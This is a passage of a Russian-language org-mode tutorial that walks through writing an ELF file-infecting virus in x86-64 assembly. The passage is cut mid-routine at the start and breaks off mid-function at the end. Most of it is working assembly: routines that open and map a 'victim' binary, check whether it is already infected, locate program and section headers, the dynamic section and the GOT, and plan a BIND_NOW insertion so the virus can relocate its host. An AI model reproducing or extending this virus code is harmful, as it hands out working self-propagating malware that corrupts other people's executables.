      movq    $-1, get_virus_success(%rip)
      movq    $-1, recount_success(%rip)

      xor     %rax, %rax
      jmp     _clear_old_data_exit

  _clear_old_data_fail:
      mov     $-1, %rax

  _clear_old_data_exit:
      pop    %rbx
      ret

#+END_SRC

*** Парсинг жертвы
Чтоб заразить какой-то эльф файл, нам нужно ответить на несколько
вопросов:
- действительно ли это эльф файл
- заражен он уе или чист
- где находятся заголовки сегментов и сколько их, сколько места в памяти
  они суммарно занимают
- где находятся заголовки секций, сколько их и сколько места в памяти
  занимают
- где начинается код жертвы (т.е. все, что между таблицами заголовков) и
  каков его виртуальный адрес
- если ли секция ~dynamic~
- если она есть, то есть секция ~got~
- ищем таблицу символов ~symtab~
- а так же определяем, используется ли "ленивое" связывание или все
  библиотечкие вызовы связываются сразу - это мы понимаем по наличию
  записи ~BIND_NOW~ в секции ~dynamic~

А зачем нам информация о связывании? Не все ли равно?
Дело в том, что сочетание динамической линковки и позиционно-зависимого
кода дает занимательный коктейль проблем.

С одной стороны у нас есть позиционно-зависимый код, из-за чего после
работы вируса, код жертвы придется сдвигать на его прежние адреса - как
буждто заражения и не было. Иначе мы будем переходить на уже неактуальные
адреса, и программа будет сегфолтиться. Урегулировать все ссылки вручную
сишном трудно, поэтому файл надо однозначно сдвигать в памяти процесса.

А с другой стороны во время загрузки файла, у нас включается линкер,
который должен связать ссылки в библиотеках друг на друга. После того,
как линкер завершит своб работу, он поместит свой адрес в таблицу ~GOT~ -
так мы сможем его вызвать при использовании "ленивого" связывания.
Линкер берет всю нужную ему инфу из секции ~dynamic~.

Затем управление переходит в жертву, а та вызывает ~libc~, чтоб
обеспечить корректный старт. После чего программа дойдет до своего
последнего ~ret~ и... снова вызовется ~libc~, которая обеспечит
корректный выход. ~libc~ в свою очередь использует код в специальных
секциях, кторые находятся в файле, например, ~fini~. И информация об этих
секциях тоже содержится в секции ~dynamic~.

И казалось бы, нет никаких проблем: вирус отрабатывает, мы редактируем
записи в секции dynamic так, как будто заражения не было,
т.е. восстанавливаем старые адреса, жертва сдвигается, а дальше и линкер,
и ~libc~ черпают нужную им информацию из ~dynamic~. А поскольку мы все
правильно отредатировали, все работает.

Но из-за экономии ресурсов, линкер во время загрузки, еще до передачи
управления программе, считывает всю нужную ему и ~libc~ информацию в
специальный буфер, который он себе заводит. А адрес на этот буфер кладет
в одну из записей ~GOT~.
И больше ни линкер, ни ~libc~ не обращаются к секции ~dynamic~
напрямую. В результате у нас проблема: не сдвигать жертву мы не можем. А
если сдвинуть ее, то информация, которая записана в буфере линкера,
станет неактуальной.

И вот поэтому нам нужно избавиться от ленивого связывания, чтоб буфер
стал просто не нужен. И именно поэтому мы ищем запись ~BIND_NOW~ - если
она есть, то все линкуется до того, как программе переходит
управление, а если записи нет, то связывание ленивое - и мы от него
избавимся, вставив свою запись ~BIND_NOW~.

А теперь вернмся к парсингу файла жертвы.
Для начала нам надо его открыть, смаппить в память и сохранить адрес на
эту память в переменную ~victim_elf_addr~
#+NAME: _get_victim_addr
#+BEGIN_SRC asm
  /// Открывает файл и сохраняет его
  /// адрес
  _get_victim_addr:
      push    %rdi
      push    %rsi

      mov     file_name_ptr(%rip), %rdi
      mov     $O_RDWR, %rsi
      call    _openfile

      cmp     $0x0,  %rax
      jl      _get_victim_addr_fail

      mov     %rax, victim_elf_addr(%rip)
      xor     %rax, %rax
      jmp     _get_victim_addr_exit

  _get_victim_addr_fail:
      mov     $-1, %rax

  _get_victim_addr_exit:
      pop    %rsi
      pop    %rdi
      ret

#+END_SRC

Затем мы хотим проверить, является ли этот файл эльф-файлом или нет.
Выяснить это просто: в начале эльф-файла всегда будут находиться
"магические байты", которые однозначно укажут на принадлежность этого
файла к эльфам. Если все окей, то в ~RAX~ попадет 0, а иначе -1.

#+NAME: _is_it_elf
#+BEGIN_SRC asm
  /// IS_IT_ELF
  /// PARAMS
  /// Проверяет наличие магических байт в
  /// загруженном эльфе
  /// Если магические байты есть, то
  /// возвращает 1 в RAX
  /// В противном случае - 0
  magic_bytes_example:
      .quad 0x10102464c457f

  _is_it_elf:
      push    %rdx
      push    %rbx
      push    %rsi
      push    %rcx

      mov     victim_elf_addr(%rip), %rbx
      test    %rbx, %rbx
      je      _is_it_elf_fail

      movq    (%rbx), %rdx
      mov     magic_bytes_example(%rip), %rsi

      cmp     %rsi, %rdx
      jne     _is_it_elf_fail

      xor     %rax, %rax
      jmp     _is_it_elf_exit

  _is_it_elf_fail:
      mov     $-1, %rax

  _is_it_elf_exit:
      pop     %rcx
      pop     %rsi
      pop     %rbx
      pop     %rdx
      ret

#+END_SRC

Предположим, это все-таки эльф. Теперь самое логичное - это проверить,
инфицирован ли файл. Но мы не можем сделать это так сразу.

Как вообще проверить, инфицирован ли файл?
Очевидная идея: берем точку входа вируса и точку входа жертвы и
сравниваем их n байт. Если последовательность совпала, то файл
инфицирован. Благо, что виртуальный адрес точки входа жертвы у нас есть в
загоове эльфа.

Но это не сработает по нескольким причинам.

Во-первых, когда файл мапится в память, то виртуальные адреса программы
могут служить нам лишь ориентиром, показывая, как далеко находится тот
или иной код друг от друга. Так что сначала надо выяснить, где
располагается точка входа жертвы в память.

Логичный шаг для этого найти, с какого виртуального адреса начинается
эльф-файл - это будет виртуальный адрес первого загружаемого сегмента
кода - вычесть этот виртуальный адрес из виртуального адреса точки
входа и таким образом выяснить, как далеко точка вход находится от начала
файла. Затем просто прибавить это смещение к адресу в ~victim_elf_addr~,
и дело в шляпе.

Но тут есть новая проблема: ~mmap~ не учитывает выравнивания, когда
грузит файл в память. Он грузит код ровно так, как он расположен в
файле.

Скажем, начальный виртуальный адрес эльфа ~0x400000~, а адрес ~start~
жертвы - ~0x600000~. Так получается, потому что между первым загружаемым
сегментом кода и сегментом, где лежит ~start~, есть выравнивание в
~200000~ байт. Так что если вычесть одно из другого, то  мы получим
разницу в ~200000~.

Но в файле-то код идет подряд. И на самом деле разница между началом
эльфа и точкой ~start~ 300 байт, а не 200 тыс. В результате попытка
посчитать адрес ~start~ в смапенном файле таким образом приведет к
сегфолту: мы будем пытаться обратиться к памяти, которая лежит далеко за
границами смапенного файла.

Поскольку я не нашел вариант, как из виртуального адреса высчитать
смещение в файле, то придется искать вирус во всех секциях кода, которые
обозначены как ~PROGBITS~ - т.е. содержимое секции установлено
программой и именно этот тип заголовка имеет секция ~.text~

Кстати, а почему в секциях, а не в сегментах?
А дело в том, что ~start~ как правило не оказывается в самом начале
загружаемого сегмента. Загружаемый сегмент кода, по крайней мере у меня,
не начинается с секции ~text~. В результате, чтоб точно не проворонить
вирус, придется прочесывать все сегменты целиком - а они значительно
больше секций по размеру. В то время как секции более мелкие, а потому
можно проверять только их начало.

Поэтому прежде чем проверять, инфицирован ли файл, надо сначала найти
заголовки секций в файле.

Сделать это легко: заголовок эльфа содержит в себе информацию о
количестве заголовков секций и смещении первого из них от начала файла.
Так что базовый адрес эльфа из ~victim_elf_addr~ + смещение до заголовков
секций = ~victim_shdr_table_addr~ (адрес таблицы заголовков секций в
памяти). Ну а количество секций вообще считать не надо, только
скопировать из заголовка эльфа.
Так же нам придется в будущем вписывать секции обратно в файл, а значит
надо знать, сколько места они занимают суммарно. Количество секций * 64
байта (размер одной секции ) = размер всех секций в байтах.
#+NAME: _get_shdrs_info
#+BEGIN_SRC asm
  /// получает данные о заголовках секций
  /// жертвы:
  /// - адрес заголовков в памяти
  /// - количество
  /// - суммарно занимаемая память
  /// в случае провала возвращ. -1
  _get_shdrs_info:
      push    %rdi
      push    %rsi
      push    %rcx
      push    %rdx

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _get_shdrs_info_fail
      mov     %rdi, %rsi

      mov     ELF_E_SHOFF(%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, victim_shdr_table_addr(%rip)

      mov     ELF_E_SHNUM(%rdi), %ecx
      movzwl  %cx, %ecx
      mov     %rcx, victim_shdr_amount(%rip)

      mov     $0x40, %rdx
      imul    %rcx,  %rdx
      mov     %rdx, victim_shdr_table_size(%rip)

      xor     %rax, %rax
      jmp     _get_shdrs_info_exit

  _get_shdrs_info_fail:
      mov     $-1, %rax

  _get_shdrs_info_exit:
      pop     %rdx
      pop     %rcx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

И вот после этого можно проверять, инфицирован ли файл.
Для этого мы берем каждый заголовок секции. Проверяем его тип, если не
~PROGBITS~, то пропускаем загоовок.
Иначе считываем смещение из заголовка - оно указывает на смещение
описываемого кода от начала эльфа - прибавляем его к базовому адресу
эльфа в памяти, получая таким образом адрес секции в памяти, а затем
проверяем ее первые 32 байта. Если все совпали, файл заражен.

#+NAME: _check_file_infection
#+BEGIN_SRC asm
  /// _CHECK_FILE_INFECTION
  /// Проверяет, является ли открытый файл зараженным
  /// - проверяем каждую загружаемую секцию
  /// - берем ее смещение, считаем адрес его кода
  ///   в памяти
  /// - сравнивам первый 32 байта по этому адресу со
  ///   start вируса
  /// - если совпали - файл заражен, вернуть -1
  /// - иначе проверить все сегменты, если нигде не совпало,
  /// вернуть 0
  _check_file_infection:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %rbx
      push    %r8
      push    %rdi
      push    %rsi

      mov     victim_elf_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _check_file_infection_fail

      mov     victim_shdr_table_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _check_file_infection_fail

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _check_file_infection_fail

      leaq    _start(%rip), %rdi

  _check_file_infection_cycle:
      push    %rcx
      mov     SHDR_SH_TYPE(%rsi), %rbx

      // секция SHT_PROGBITS?
      cmp     $0x1, %bl
      jne     _next_segm


      mov     SHDR_SH_OFFSET(%rsi), %rbx
      mov     $0x4, %rcx

      // адрес сегмента в памяти
      add     %rdx, %rbx

      // проверяем конкретную
      // секцию кода
  _check_segm_infection_cycle:
      movq    (%rdi), %rax
      movq    (%rbx), %r8

      cmp     %rax,  %r8
      jne     _next_segm

      add     $0x8, %rdi
      add     $0x8, %rbx

      loop    _check_segm_infection_cycle
      jmp     _check_file_infection_fail

  _next_segm:
      pop     %rcx
      add     $0x40, %rsi
      loop    _check_file_infection_cycle

  _check_file_infection_success:
      xor     %rax, %rax
      jmp     _check_file_infection_exit

  _check_file_infection_fail:
      pop     %rcx
      mov     $-1, %rax

  _check_file_infection_exit:
      pop    %rsi
      pop    %rdi
      pop    %r8
      pop    %rbx
      pop    %rdx
      pop    %rcx
      pop    %rbx
      ret
#+END_SRC

Если файл не инфицирован, то собираем информацию о нем дальше. В
противном случае мы возьмем новый файл, если они еще остались в папке, и
будем пробовать парсить его.

Собираем информациб о заголовках сегментом так же, как собирали о
заголовках секций.

#+NAME: _get_phdrs_info
#+BEGIN_SRC asm
  /// получает данные о заголовках сегментов
  /// жертвы:
  /// - адрес заголовков в памяти
  /// - количество
  /// - суммарно занимаемая память
  /// в случае провала возвращ. -1
  _get_phdrs_info:
      push    %rdi
      push    %rsi
      push    %rcx
      push    %rdx

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _get_phdrs_info_fail

      mov     %rdi, %rsi
      mov     ELF_E_PHOFF(%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, victim_phdr_table_addr(%rip)

      mov     ELF_E_PHNUM(%rdi), %ecx
      movzwl  %cx, %ecx
      mov     %rcx, victim_phdr_amount(%rip)

      mov     $0x38, %rdx
      imul    %rcx,  %rdx
      mov     %rdx, victim_phdr_table_size(%rip)

      xor     %rax, %rax
      jmp     _get_phdrs_info_exit

  _get_phdrs_info_fail:
      mov     $-1, %rax

  _get_phdrs_info_exit:
      pop     %rdx
      pop     %rcx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Теперь ищем первый загружаемый сегмент и сохраняем его виртуальный
адрес. Это позволит нам считать разные смещения в будущем и определять
первый загружаемый сегмент среди прочих сегментов.
Первый загружаемый сегмент будет иметь самый младший адрес.
Сохраняем виртуальный адрес из первого же заголовка сегмента.
Проходимся по загоовкам сегментов, если сегмент не загружаемый - не тип
№1 (LOAD) - то пропускаем его. Иначе сравниваем его виртуальный адрес с
уже имеющимся. Если он меньше, то сохраняем его. И так до тех пор, пока
все заголовки сегментов не кончатся.

#+NAME: _find_first_seg_vaddr
#+BEGIN_SRC asm
  /// Ищет и заполняет данные о
  /// первом сегменте кода эльфа
  _find_first_seg_vaddr:
      push    %rcx
      push    %r8

      mov     victim_phdr_table_addr(%rip), %r8
      mov     victim_phdr_amount(%rip), %rcx

      test    %r8, %r8
      je      _find_first_seg_vaddr_fail

      test    %rcx, %rcx
      je      _find_first_seg_vaddr_fail

      mov     %r8, %rdi

  _find_first_seg_vaddr_cycle:
      cmp     $0x1, (%rdi)
      jne     _find_first_seg_vaddr_next

      cmp     $0x1, (%r8)
      jne     _set_first_seg

      mov     PHDR_P_VADDR(%rdi), %rsi
      mov     PHDR_P_VADDR(%r8), %rax

      cmp     %rax, %rsi
      jl      _set_first_seg
      jmp     _find_first_seg_vaddr_next

  _set_first_seg:
      mov     %rdi, %r8

  _find_first_seg_vaddr_next:
      add     $0x38, %rdi
      loop    _find_first_seg_vaddr_cycle

  _find_first_seg_vaddr_success:
      leaq    first_seg_vaddr(%rip), %rsi
      mov     PHDR_P_VADDR(%r8), %rdi
      mov     %rdi, (%rsi)

      leaq    first_seg_addr(%rip), %rsi
      mov     %r8, (%rsi)

      xor     %rax, %rax
      jmp    _find_first_seg_vaddr_exit

  _find_first_seg_vaddr_fail:
      mov     $-1, %rax

  _find_first_seg_vaddr_exit:
      pop     %r8
      pop     %rcx
      ret

#+END_SRC

Теперь ищем последний загружаемый сегмент в жертве. Его данные -
виртуальный адрес и выравнивание - нужны нам, чтоб правильно посчитать
новый виртуальный адрес вируса для его заголовка.
Ищем его таким же образом, как искали первый загружаемый сегмент. Только
теперь адрес должен быть больше, чем сохраненный на предыдущей итерации.

#+NAME: _find_last_seg_vaddr
#+BEGIN_SRC asm
    /// _FIND_LAST_SEG_VADDR
  /// Ищет виртуальный адрес последнего сегмента кода
  _find_last_seg_vaddr:
      push    %rcx
      push    %r8
      push    %rdi
      push    %rsi

      mov     victim_phdr_table_addr(%rip), %r8
      mov     victim_phdr_amount(%rip), %rcx

      test    %r8, %r8
      je      _find_last_seg_vaddr_fail

      test    %rcx, %rcx
      je      _find_last_seg_vaddr_fail

      mov     %r8, %rdi
  _find_last_seg_vaddr_cycle:

      cmp     $1, (%rdi)
      jne     _find_last_seg_vaddr_next

      mov     PHDR_P_VADDR(%rdi), %rsi
      mov     PHDR_P_VADDR(%r8), %rax

      cmp     %rax, %rsi
      jg      _set_last_seg
      jmp     _find_last_seg_vaddr_next

  _set_last_seg:
      mov     %rdi, %r8

  _find_last_seg_vaddr_next:
      add     $0x38, %rdi
      loop    _find_last_seg_vaddr_cycle

  _find_last_seg_vaddr_success:
      leaq    last_seg_vaddr(%rip), %rsi

      mov     PHDR_P_VADDR(%r8), %rax
      mov     PHDR_P_ALLIGN(%r8), %rcx

      mov     %rax, (%rsi)
      leaq    last_seg_allign(%rip), %rsi
      mov     %rcx, (%rsi)

      xor     %rax, %rax
      jmp     _find_last_seg_vaddr_exit

  _find_last_seg_vaddr_fail:
      mov     $-1, %rax

  _find_last_seg_vaddr_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rcx
      ret
#+END_SRC

Теперь самое время определить, есть у нас секция ~dynamic~ или нет. Если
ее нет, то динамическая линковка не предполагается, так что нам будет
совсем просто его заражать.

Все, что нужно - это пройтись по заголовкам секций и начти секцию с типом
#6 - это тип секции ~dynamic~. Если такая секция есть, то мы сохраняем ее
виртуальный адрес, ее размер, смещение от начала файла и считаем адрес в
смапенной памяти. Все эти данные понадобятся нам
при пересчете данных жертвы или для доступа к самой секции ~dynamic~

#+NAME: _find_dynamic
#+BEGIN_SRC asm
  /// _FIND_DYNAMIC
  /// Ищет заголовок секции dynamic
  /// Если находит, то заполняет данные о секции
  _find_dynamic:
      push    %rcx
      push    %rdx
      push    %rdi

      mov     victim_shdr_table_addr(%rip), %rdi
      mov     victim_shdr_amount(%rip), %rcx

      test   %rdi, %rdi
      je      _find_dynamic_fail

      test   %rcx, %rcx
      je     _find_dynamic_fail

  _find_dynamic_cycle:
      mov     SHDR_SH_TYPE(%rdi), %rdx
      cmp     $0x6, %dl   # shdr = dynamic?
      je      _find_dynamic_success

      add     $0x40, %rdi
      loop    _find_dynamic_cycle
      jmp     _find_dynamic_fail

  _find_dynamic_success:
      mov     SHDR_SH_ADDR(%rdi), %rdx
      mov     %rdx, dynamic_records_vaddr(%rip)   # dynamic sh_vaddr

      mov     SHDR_SH_OFFSET(%rdi), %rdx
      mov     %rdx, dynamic_records_offset(%rip)   # dynamic sh_offset

      mov     victim_elf_addr(%rip), %rcx
      add     %rdx, %rcx
      mov     %rcx, dynamic_records_addr(%rip)

      mov     SHDR_SH_SIZE(%rdi), %rdx
      mov     %rdx, dynamic_records_size(%rip)   # dynamic size

      xor     %rax, %rax
      jmp     _find_dynamic_exit

  _find_dynamic_fail:
      mov     $-1, %rax

  _find_dynamic_exit:
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC


Теперь мы определяем тип связывания - ленивое или нет. Для этого в секции
~dynamic~ мы ищем запись ~BIND_NOW~. Если нашли, то переменная
~new_bind_now_flag_record_size~ - т.е. размер новой записи ~BIND_NOW~ -
будет установлена в ноль. Ведь новую запись вставлять не надо.
В противном случае в эту переменную будет положено значение ~0x10~ -
размер новой записи (любая запись ~dynamic~ занимет 16 байт)

Эта переменная крайне важна: при пересчете данных жертвы мы будем
смотреть, находится ли пересчитываемый адрес/смещение ниже секции
~dynamic~. Если да, то нас придется учитывать ~возможное~ расширение секции
~dynamic~, поэтому мы будем увеличивать редактируемое значение на 56 байт
(размер вставляемого заголовка вируса) + ~содержимое~  переменной
~new_bind_now_flag_record_size~. Это позволит не проверять все время,
вставляем мы запись ~BIND_NOW~ или нет.

Так же, если запись вставляется, то нам надо узнать, куда именно в секции
~dynamic~ мы ее вставляем. У меня она вставляется перед записью ~NULL~ -
последней записью в секции ~dynamic~, которая является обязательной для
секции.
И нет, нельзя првратить ее в запись ~BIND_NOW~ именно потому, что она
является обязательной.
Так что мы сохраним смещение от начал секции ~dynamic~ до записи ~NULL~ в
переменную ~new_bind_now_record_frm_dynamic_offset~.

#+NAME: _find_bind_now_record
#+BEGIN_SRC asm
  _find_bind_now_record:
      push    %rdx
      push    %rcx
      push    %r8
      push    %rdi
      push    %rsi

      mov    dynamic_records_offset(%rip), %rdx
      test   %rdx, %rdx
      je      _find_bind_now_record_fail

      mov     dynamic_records_size(%rip),%rax
      test    %rax, %rax
      je      _find_bind_now_record_fail

      // адрес секции dynamic в памяти
      mov    victim_elf_addr(%rip), %rdi
      add    %rdx, %rdi

      mov     %rdi, %r8

      // установили счетчик цикла
      xor     %rdx, %rdx
      mov     $0x10, %ecx
      idiv    %ecx
      mov     %eax, %ecx

  _find_bind_now_record_cycle:
      // запсиь BIND_NOW?
      cmpq    $0x18, (%rdi)
      je      _bind_now_record_exist

      // запись NULL?
      cmp     $0x0, (%rdi)
      // запись NULL всегда последняя,
      // так что дальше проверять не имеет смысла
      je      _no_bind_now_record_exist

      add     $0x10, %rdi
      loop    _find_bind_now_record_cycle

      jmp     _no_bind_now_record_exist

  _bind_now_record_exist:
      //  обнуили размер новой записи - ее же не будет
      movb    $0x0, new_bind_now_flag_record_size(%rip)
      xor     %rax, %rax

      jmp     _find_bind_now_record_exit

      // записи BIND_NOW нет - придется позже генерировать новую
  _no_bind_now_record_exist:
      movb    $0x10, new_bind_now_flag_record_size(%rip)

      // посчитали смещение от начала секции dynamic
      // до места, куда будем вписывать новую запись
      sub     %r8, %rdi
      mov     %rdi, new_bind_now_record_frm_dynamic_offset(%rip)

      xor     %rax, %rax
      jmp     _find_bind_now_record_exit

  _find_bind_now_record_fail:
      mov     $-1, %rax

  _find_bind_now_record_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rcx
      pop     %rdx
      ret

#+END_SRC

Ну и теперь надо найти таблицу ~GOT~ в файле.
Искать мы ее будем не через заголовки секций или сегментов, а через
секцию ~dynamic~. Дело в том, что у таблицы ~GOT~ нет своей специфической
секции - у кого-то она расположена в секции ~.got~,  у кого-то в
~.got.plt~ и т.д. А у этих секций нет своего специфического номера типа -
как, например, у секции ~rela~ (тип 4) и у секции ~dynamic~ (тип 6).

Зато ее можно найти в ~dynamic~: запись о таблице ~GOT~ будет иметь тип
3 и в ней будет указан виртуальный адрес ~GOT~, что позволит нам находить
заголовок этой таблицы в таблице секций, а уже через него найти GOT в
смапенной памяти.

#+NAME: _find_got_section_vaddr
#+BEGIN_SRC asm
  /// _FIND_GOT_SECTION
  /// Ищет запись GOT в секции dynamic
  /// и сохраняет виртуальный адрес секции
  /// GOT, если находит запись о ней
  _find_got_section_vaddr:
      push    %rcx
      push    %rdx
      push    %rdi

      // проверяем данные
      mov     dynamic_records_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_got_section_vaddr_fail

      mov     dynamic_records_size(%rip), %rax
      test    %rax, %rax
      je      _find_got_section_vaddr_fail

      xor     %rdx, %rdx
      mov     $0x10, %ecx
      idiv    %ecx

      mov     %eax, %ecx  # количество записей
      mov     %rdi, %rsi

  _find_got_section_vaddr_cycle:
      cmpl     $0x3, (%rdi)
      je      _find_got_section_vaddr_success

      add     $0x10,%rdi
      loop    _find_got_section_vaddr_cycle
      jmp     _find_got_section_vaddr_fail

  _find_got_section_vaddr_success:
      add     $0x8, %rdi
      mov     (%rdi), %rax
      mov     %rax, GOT_vaddr(%rip)

      xor     %rax, %rax
      jmp     _find_got_section_vaddr_exit

  _find_got_section_vaddr_fail:
      mov     $-1, %rax

  _find_got_section_vaddr_exit:
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

А после того, как нашли виртуальный адрес ~GOT~, можно найти заголовок
этой секции и высчитать адрес, по которому GOT находится в спаменной
памяти - это даст доступ к ~GOT~ в любой момент.

Адрес высчитывает просто: базовый адрес эльфа в памяти + смещение секции от
начала файла.
#+NAME: _find_got_section_im_memory
#+BEGIN_SRC asm
  /// _FIND_GOT_SECTION_IM_MEMORY
  /// высчитывает адрес секции GOT
  /// в памяти и ее размер
  _find_got_section_im_memory:
      push    %rdx
      push    %rcx
      push    %rdi
      push    %rsi

      // проверяем данные
      mov     victim_elf_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _find_got_section_im_memory_fail

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _find_got_section_im_memory_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_got_section_im_memory_fail

      mov     GOT_vaddr(%rip), %rdx
      test    %rdx, %rdx
      je      _find_got_section_im_memory_fail

  _find_got_section_im_memory_cycle:
      add     $0x10, %rdi
      cmp     %rdx, (%rdi)

      je      _find_got_section_im_memory_success

      add     $0x30, %rdi

      loop    _find_got_section_im_memory_cycle
      jmp     _find_got_section_im_memory_fail

  _find_got_section_im_memory_success:
      add     $0x8, %rdi # sh_offset
      mov     (%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, GOT_addr_in_memory(%rip)

      add     $0x8, %rdi # sh_size
      mov     (%rdi), %rcx
      mov     %rcx, GOT_size(%rip)

      xor     %rax, %rax
      jmp     _find_got_section_im_memory_exit

  _find_got_section_im_memory_fail:
      mov     $-1, %rax

  _find_got_section_im_memory_exit:
      pop     %rsi
      pop     %rdi
      pop     %rcx
      pop     %rdx
      ret

#+END_SRC

Теперь можно определить адрес кода жертвы и его размер.
Кодом жертвы я называю все, что находится между таблицей заголовков сегментов и
таблицей заголовков секций.
Это нужно, чтоб при перекомпоновке мы могли вписать в эльф код жертвы.

В зависимости от того, вставляем мы запись ~BIND_NOW~ или нет, мы
по-разному высчитываем информацию о коде жертвы и сохраняем ее.
Если ~BIND_NOW~ вставляеться ~не~ будет, то код жертвы можено будет
записать в файл одним вызовом. Тогда нам понадобится только адрес его
начала в памяти размер.

Вы считать это просто: код жертвы начнется сразу от талицы заголовков
сегментов. Так что мы берем размер этой таблицы + размер заголовка
эльфа + базовый адрес эльфа в памяти = адрес начала кода жертвы в памяти.

Затем высчитываем конечный адрес: базовый адрес эльфа в памяти + смещение
до таблицы заголовков секций. Вычитая один адрес из другого, мы получаем
размер этого кода.

#+NAME: _get_victim_whole_code_addr_and_size
#+BEGIN_SRC asm
  /// _GET_VICTIM_WHOLE_CODE_ADDR_AND_SIZE
  /// Высчитывает адрес и размер всего кода жертвы,
  /// если мы не генерируем запись BIND_NOW
  _get_victim_whole_code_addr_and_size:
      push    %rcx
      push    %rdx

      // проверяем наличие всех необходимых данных
      // мы генерируем новыую запись BIND_NOW?
      // если да, то этот метод вычисления размера и адреса
      // кода жертвы нам не подходит
      mov     new_bind_now_flag_record_size(%rip), %rcx
      test    %rcx, %rcx
      jne     _get_victim_whole_code_addr_and_size_fail

      mov     victim_phdr_table_size(%rip), %rcx
      test    %rcx, %rcx
      je      _get_victim_whole_code_addr_and_size_fail

      mov     victim_phdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_whole_code_addr_and_size_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_whole_code_addr_and_size_fail

      // вычисляем размер и адрес кода жертвы
      leaq    victim_code_offset(%rip), %rdx
      mov     %rcx, (%rdx)
      add     $0x40, (%rdx)

      // считаем адрес кода жертвы
      mov     victim_phdr_table_addr(%rip), %rdx
      add     %rdx, %rcx
      mov     %rcx, victim_code_addr(%rip)

      // считаем  размер кода жертвы
      mov     victim_shdr_table_addr(%rip), %rdx
      sub     %rcx, %rdx
      mov     %rdx, victim_code_size(%rip)

      xor     %rax, %rax
      jmp     _get_victim_whole_code_addr_and_size_exit

  _get_victim_whole_code_addr_and_size_fail:
      mov     $-1, %rax

  _get_victim_whole_code_addr_and_size_exit:
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Если же ~BIND_NOW~ вставляется, то все становится сложнее.
Нам нужно будет вписать в файл сначала весь код жертвы до меса вставки,
затем саму запись, а затем оставшийся код.

Поэтому мы считаем адрес начала кода жертвы, как это было показано
выше и сохраняем его в ~victim_code_before_bind_now_addr~.
Затем считаем адрес в памяти, по которому будет вставляться
~BIND_NOW~ как смещение до секции ~dynamic~ + смещение от ~dynamic~ до
вставляемой ~BIND_NOW~ + базовый адрес эльфа в памяти. Сохраняем этот
адрес как адрес оставшейся части кода жертвы в ~victim_code_after_bind_now_addr~

Вычитаем адрес начала кода из полученного и таким образом получаем
размер кода жертвы от начала до места вставки

А затем высчитываем, где код жертвы кончается: базовый адрес эльфа +
смещение до таблицы заголовков секций. И вычитая адрес из
~victim_code_after_bind_now_addr~ из полученного, высчитываем размер
оставшегося кода жертвы.

#+NAME: _get_victim_code_addr_and_size_with_bind_now
#+BEGIN_SRC asm
  /// _GET_VICTIM_CODE_ADDR_AND_SIZE_WITH_BIND_NOW
  /// Если мы вставляем запись BIND_NOW,
  /// то высчитываем:
  /// - адрес и размер кода жертвы от его начала до
  ///   места вставки BIND_NOW
  /// - адрес и размер кода жертвы от места вставки BIND_NOW
  ///   и до его конца
  _get_victim_code_addr_and_size_with_bind_now:
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      // вставляем BIND_NOW?
      mov     new_bind_now_flag_record_size(%rip), %rcx
      test    %rcx, %rcx
      je     _get_victim_code_addr_and_size_with_bind_now_fail

      // проверка необходимых данных для высчитывания
      mov     victim_phdr_table_size(%rip), %rcx
      test    %rcx, %rcx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     victim_phdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov      dynamic_records_offset(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     new_bind_now_record_frm_dynamic_offset(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      // если все данные на месте, начинаем считать
      mov     victim_phdr_table_size(%rip), %rcx
      leaq    victim_code_offset(%rip), %rdx
      mov     %rcx, (%rdx)
      add     $0x40, (%rdx)   # save victim begin code offset

      mov     victim_phdr_table_addr(%rip), %rdx
      add     %rdx, %rcx

      // сохранили адрес начала кода
      mov     %rcx, victim_code_before_bind_now_addr(%rip)

      mov     dynamic_records_offset(%rip), %rdi
      mov     new_bind_now_record_frm_dynamic_offset(%rip), %rsi
      add     %rdi, %rsi  # offsetnew bind_now record frm file begin

      mov     victim_elf_addr(%rip), %rdx
      add     %rsi, %rdx

      // высчитали адрес кода от места вставки
      mov     %rdx,  victim_code_after_bind_now_addr(%rip)
      sub     %rcx, %rdx
      // высчитали размер кода от начала до вставки
      mov     %rdx, victim_code_before_bind_now_size(%rip)

      // высчитали размер кода от вставки до конца
      mov     victim_code_after_bind_now_addr(%rip), %rsi
      mov     victim_shdr_table_addr(%rip), %rdx
      sub     %rsi, %rdx
      mov     %rdx, victim_code_after_bind_now_size(%rip)

      xor     %rax, %rax
      jmp     _get_victim_code_addr_and_size_with_bind_now_exit
  _get_victim_code_addr_and_size_with_bind_now_fail:
      xor     $-1, %rax

  _get_victim_code_addr_and_size_with_bind_now_exit:
      pop     %rsi
